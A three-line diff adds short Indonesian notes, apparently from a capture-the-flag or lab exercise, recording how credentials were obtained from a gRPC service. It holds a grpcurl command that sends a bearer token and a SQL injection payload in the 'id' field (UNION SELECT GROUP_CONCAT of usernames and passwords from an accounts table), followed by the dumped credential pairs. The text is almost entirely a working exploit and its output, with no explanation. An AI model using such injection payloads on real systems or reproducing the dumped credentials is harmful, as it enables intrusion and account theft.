@@ -1,0 +1,3 @@
+dapat creds dari
+	- `grpcurl -plaintext -format text -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTcwNTQyODcwMH0._IZo0uKgIs-AFAghB-Ggh7gjBRbOayV9D0LGzWucY2U' -d 'id: "464 UNION SELECT GROUP_CONCAT(username || password) FROM accounts;--"' 10.10.11.214:50051 SimpleApp.getInfo`
+	- adminadmin,sauHereIsYourPassWord1431
